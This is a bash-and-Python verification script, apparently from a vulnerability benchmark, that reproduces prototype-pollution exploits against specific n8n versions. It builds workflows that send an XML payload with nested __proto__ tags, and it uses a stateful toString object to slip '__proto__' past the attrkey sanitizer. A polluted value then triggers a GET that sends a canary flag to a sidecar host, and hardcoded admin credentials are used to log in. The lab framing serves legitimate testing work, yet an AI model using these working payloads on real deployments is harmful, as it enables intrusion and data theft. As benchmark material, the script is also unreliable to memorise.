#!/usr/bin/env bash
# verify.sh --seed|--residual — n8n-cve-2026-44791 (PCBV2-0020)
#
# 机制：
#   seed     Webhook -> XML(xmlToJson) -> HTTP GET 链。XML 里嵌套标签名 __proto__
#            （xml2js 用 defineProperty 生成 own '__proto__' 属性），n8n-workflow
#            deepCopy 执行 clone['__proto__'] = copiedValue 触发 setter，输出 item
#            的 prototype 被替换；下一节点表达式 $json.root[1].pcb_seed_flag 沿原型链
#            取到 value 并 GET sidecar /ingest?seed=<FLAG>（CVE-2026-42232）。
#            2.17.3 无 sanitizer -> 污染 -> sidecar_hits.json 出现 seed=<FLAG>；
#            2.20.6 sanitizeXmlName 重命名 __proto__ -> 无污染 -> 只有 seed= 空行。
#   residual Function 节点构造 stateful toString 对象（首次 'safe' 后续 '__proto__'），
#            经表达式注入 XML 节点 options.attrkey：2.20.6 的校验只查 String() 拷贝
#            （'safe' 通过），xml2js 解析时用 raw 对象再 coercion 得 '__proto__'，
#            defineProperty 把 XML 属性 pcb_res_flag=<FLAG> 写到原型链；下一节点
#            $json.pcb_res_flag 取到 FLAG 并 GET sidecar /ingest?res=<FLAG>
#            （CVE-2026-44791 TOCTOU；2.20.7 起 attrkey 被 String() 固定，无污染）。
# 效果通道 = sidecar 记录的 exfil 命中（sidecar_hits.json 新增行含 seed=/res=<FLAG>）。
# 判定基准 = RUN_FLAG_REF（回退 RUN_FLAG；wrong/stale 检查时 RUN_FLAG 为 override）。
# 退出码：0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }

CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
FLAG_REF="${RUN_FLAG_REF:-$RUN_FLAG}"
JUDGE_FLAG="${RUN_FLAG_REF:-$RUN_FLAG}"
mkdir -p "$WORK_DIR" 2>/dev/null || true
if [[ -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi
export PCB_FLAG="${RUN_FLAG}"

dc() { docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" "$@"; }

case "$VERSION" in
  v0) PORT_FB="${PORT_V0_0:-}";;
  v1) PORT_FB="${PORT_V1_0:-}";;
  v2) PORT_FB="${PORT_V2_0:-}";;
  *) echo "bad VERSION=$VERSION" >&2; exit 30;;
esac

# Restore official tag from pin if a sibling JIT untagged n8nio/n8n:X.
case "$VERSION" in
  v0) docker image inspect n8nio/n8n:2.17.3 >/dev/null 2>&1 || docker tag pcb-n8n:2.17.3 n8nio/n8n:2.17.3 2>/dev/null || true;;
  v1) docker image inspect n8nio/n8n:2.20.6 >/dev/null 2>&1 || docker tag pcb-n8n:2.20.6 n8nio/n8n:2.20.6 2>/dev/null || true;;
  v2) docker image inspect n8nio/n8n:2.20.7 >/dev/null 2>&1 || docker tag pcb-n8n:2.20.7 n8nio/n8n:2.20.7 2>/dev/null || true;;
esac

# Keep start.sh bindings (--no-recreate). After the first probe, recycle n8n
# only (not sidecar) so proto pollution / in-flight seed cannot leak into wrong/stale.
dc up -d --pull never --no-recreate >/dev/null 2>&1 || true
STAMP="$WORK_DIR/.pcb_probed"
if [[ -f "$STAMP" ]]; then
  dc restart "$VERSION" >/dev/null 2>&1 || true
fi
touch "$STAMP"
: > "$CASE_DIR/sidecar_hits.json"

resolve_host_port() {
  local svc="$1" cport="$2" fallback="${3:-}"
  local p="" cid="" i
  for i in 1 2 3 4 5 6; do
    p="$(dc port "$svc" "$cport" 2>/dev/null | awk -F: 'NR==1{gsub(/[[:space:]]/,"",$NF); print $NF}')"
    if [[ "$p" =~ ^[0-9]+$ ]]; then
      printf '%s' "$p"
      return 0
    fi
    sleep 1
  done
  cid="$(dc ps -aq "$svc" 2>/dev/null | head -1 || true)"
  if [[ -n "$cid" ]]; then
    p="$(docker inspect --format '{{(index (index .NetworkSettings.Ports "'"$cport"'/tcp") 0).HostPort}}' "$cid" 2>/dev/null | tr -d '[:space:]')"
    if [[ "$p" =~ ^[0-9]+$ ]]; then
      printf '%s' "$p"
      return 0
    fi
  fi
  if [[ "$fallback" =~ ^[0-9]+$ ]]; then
    printf '%s' "$fallback"
    return 0
  fi
  return 1
}

PORT="$(resolve_host_port "$VERSION" 5678 "$PORT_FB" || true)"
SIDECAR_PORT="$(resolve_host_port sidecar 8000 "${PORT_SIDECAR_0:-}" || true)"
if [[ ! "$PORT" =~ ^[0-9]+$ ]]; then
  echo "verify: no published n8n :5678 (compose.env missing or stack down)" >&2
  dc ps >&2 || true
  exit 20
fi
export PCB_TARGET_PORT="$PORT"
export PCB_SIDECAR_PORT="${SIDECAR_PORT:-}"

"$PY" - "$PORT" "$RUN_FLAG" "$MODE" "$CASE_DIR/sidecar_hits.json" <<'PYEOF'
import json, os, sys, time, requests

port, payload_flag, mode, hits_file = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
judge = os.environ.get("RUN_FLAG_REF") or payload_flag
base = f"http://127.0.0.1:{port}"
ADMIN_EMAIL, ADMIN_PASS = "admin@pcb.local", "Admin12345!"
FLAG_KEY = "pcb_seed_flag" if mode == "--seed" else "pcb_res_flag"


def wait_http(timeout=300):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            code = requests.get(base + "/", timeout=6).status_code
            if 200 <= code < 600:
                return True
        except Exception:
            pass
        time.sleep(3)
    return False


def as_json(resp):
    """SPA/empty 200 is not a REST body (gpu1 first-boot flake)."""
    try:
        data = resp.json()
    except Exception:
        return None
    return data if isinstance(data, dict) else None


def session():
    last = "login failed"
    for _ in range(40):
        s = requests.Session()
        try:
            s.post(base + "/rest/owner/setup",
                   json={"firstName": "pcb", "lastName": "admin",
                         "email": ADMIN_EMAIL, "password": ADMIN_PASS}, timeout=15)
        except Exception:
            pass
        try:
            lr = s.post(base + "/rest/login",
                        json={"emailOrLdapLoginId": ADMIN_EMAIL, "password": ADMIN_PASS},
                        timeout=15)
            body = as_json(lr)
            if lr.status_code == 200 and body and body.get("data"):
                return s
            last = f"login failed {lr.status_code}: {lr.text[:200] or '<empty>'}"
        except Exception as e:
            last = str(e)
        time.sleep(3)
    raise RuntimeError(last)


def wait_ready(timeout=300):
    if not wait_http(timeout):
        print("verify: http not ready", file=sys.stderr)
        return False
    try:
        session()
        return True
    except Exception as e:
        print(f"verify: login not ready: {e}", file=sys.stderr)
        return False


def deactivate_all(s):
    try:
        r = s.get(base + "/rest/workflows?limit=100", timeout=15)
        for w in r.json().get("data", []):
            if w.get("active"):
                wid = w["id"]
                vr = s.get(base + f"/rest/workflows/{wid}", timeout=15).json()["data"].get("versionId")
                try:
                    s.post(base + f"/rest/workflows/{wid}/deactivate", json={"versionId": vr}, timeout=15)
                except Exception:
                    pass
    except Exception:
        pass


def create_active_workflow(wf):
    last = "create failed"
    for attempt in range(8):
        s = session()
        deactivate_all(s)
        try:
            r = s.post(base + "/rest/workflows", json=wf, timeout=60)
        except Exception as e:
            last = f"workflow create request: {e}"
            time.sleep(3)
            continue
        body = as_json(r)
        data = (body or {}).get("data") if r.status_code in (200, 201) else None
        if not (isinstance(data, dict) and data.get("id")):
            last = f"workflow create failed: {r.status_code} {r.text[:300] or '<empty>'}"
            time.sleep(3)
            continue
        wfid = data["id"]
        version_id = data.get("versionId")
        path = wf["nodes"][0]["parameters"]["path"]
        try:
            ar = s.post(base + f"/rest/workflows/{wfid}/activate",
                        json={"versionId": version_id}, timeout=60)
        except Exception as e:
            last = f"activate request: {e}"
            time.sleep(3)
            continue
        if ar.status_code not in (200, 201):
            last = f"activate failed: {ar.status_code} {ar.text[:300] or '<empty>'}"
            time.sleep(3)
            continue
        return path
    raise RuntimeError(f"{last} (after {attempt + 1} tries)")


def make_seed_workflow(path, flag_key, flag):
    xml = f"<root><__proto__><{flag_key}>{flag}</{flag_key}></__proto__></root>"
    url = ("={{ 'http://sidecar:8000/ingest?seed=' + ($json.root[1] && $json.root[1]."
           + flag_key + " || '') }}")
    return {
        "name": f"pcb-seed-{path}",
        "nodes": [
            {"parameters": {"httpMethod": "POST", "path": path, "responseMode": "onReceived",
                            "options": {}},
             "type": "n8n-nodes-base.webhook", "typeVersion": 2,
             "position": [0, 300], "name": "Webhook", "webhookId": path},
            {"parameters": {"mode": "xmlToJson", "dataPropertyName": "body", "options": {}},
             "type": "n8n-nodes-base.xml", "typeVersion": 1, "position": [200, 300], "name": "XML"},
            {"parameters": {"method": "GET", "url": url, "options": {}},
             "type": "n8n-nodes-base.httpRequest", "typeVersion": 3,
             "position": [400, 300], "name": "HTTP"},
        ],
        "connections": {
            "Webhook": {"main": [[{"node": "XML", "type": "main", "index": 0}]]},
            "XML": {"main": [[{"node": "HTTP", "type": "main", "index": 0}]]},
        },
        "settings": {},
    }


def make_residual_workflow(path, flag_key, flag):
    data_xml = f"<root {flag_key}=\\'{flag}\\'>x</root>"
    fn_code = f"""// benign benchmark canary: stateful coercion object
let calls = 0;
const evil = {{ toString: () => (++calls === 1 ? 'safe' : '__proto__') }};
return [{{ json: {{ data: '{data_xml}', evil }} }}];
"""
    url = ("={{ 'http://sidecar:8000/ingest?res=' + (($json."
           + flag_key + " || '')) }}")
    return {
        "name": f"pcb-res-{path}",
        "nodes": [
            {"parameters": {"httpMethod": "POST", "path": path, "responseMode": "onReceived",
                            "options": {}},
             "type": "n8n-nodes-base.webhook", "typeVersion": 2,
             "position": [0, 300], "name": "Webhook", "webhookId": path},
            {"parameters": {"functionCode": fn_code},
             "type": "n8n-nodes-base.function", "typeVersion": 1,
             "position": [200, 300], "name": "FN"},
            {"parameters": {"mode": "xmlToJson", "dataPropertyName": "data",
                            "options": {"mergeAttrs": False, "attrkey": "={{ $json.evil }}"}},
             "type": "n8n-nodes-base.xml", "typeVersion": 1, "position": [400, 300], "name": "XML"},
            {"parameters": {"method": "GET", "url": url, "options": {}},
             "type": "n8n-nodes-base.httpRequest", "typeVersion": 3,
             "position": [600, 300], "name": "HTTP"},
        ],
        "connections": {
            "Webhook": {"main": [[{"node": "FN", "type": "main", "index": 0}]]},
            "FN": {"main": [[{"node": "XML", "type": "main", "index": 0}]]},
            "XML": {"main": [[{"node": "HTTP", "type": "main", "index": 0}]]},
        },
        "settings": {},
    }


def sidecar_hits():
    try:
        with open(hits_file) as f:
            return [l for l in f.read().splitlines() if l.strip()]
    except Exception:
        return []


def wait_for_new_hit(baseline, needle, timeout):
    deadline = time.time() + timeout
    while time.time() < deadline:
        for h in sidecar_hits():
            if h not in baseline and needle in h:
                return True
        time.sleep(3)
    return False


if not wait_ready():
    print("verify: env not ready", file=sys.stderr)
    sys.exit(20)

sp = os.environ.get("PCB_SIDECAR_PORT")
if sp:
    try:
        requests.get(f"http://127.0.0.1:{sp}/clear", timeout=5)
    except Exception:
        pass
try:
    open(hits_file, "w").close()
except Exception:
    pass
baseline = set(sidecar_hits())
needle = ("seed=" if mode == "--seed" else "res=") + judge
path = f"{'sd' if mode == '--seed' else 'rs'}{int(time.time())}"
try:
    if mode == "--seed":
        wf = make_seed_workflow(path, FLAG_KEY, payload_flag)
        p = create_active_workflow(wf)
        xml = f"<root><__proto__><{FLAG_KEY}>{payload_flag}</{FLAG_KEY}></__proto__></root>"
        r = requests.post(base + "/webhook/" + p, data=xml,
                          headers={"Content-Type": "text/plain"}, timeout=90)
        status = r.status_code
    else:
        wf = make_residual_workflow(path, FLAG_KEY, payload_flag)
        p = create_active_workflow(wf)
        r = requests.post(base + "/webhook/" + p, json={}, timeout=90)
        status = r.status_code
    hit = wait_for_new_hit(baseline, needle, timeout=120)
    hits = sidecar_hits()
    print(f"[{mode}] status={status} flag_hit={hit} hits_tail={hits[-3:]!r}")
    sys.exit(0 if hit else 10)
except requests.RequestException as e:
    print(f"verify: request failed: {e}", file=sys.stderr)
    sys.exit(20)
except Exception as e:
    print(f"verify: probe error: {type(e).__name__}: {e}", file=sys.stderr)
    sys.exit(20)
PYEOF
rc=$?
echo "verify[$MODE] version=$VERSION port=$PORT sidecar_port=$SIDECAR_PORT rc=$rc" >&2
exit "$rc"
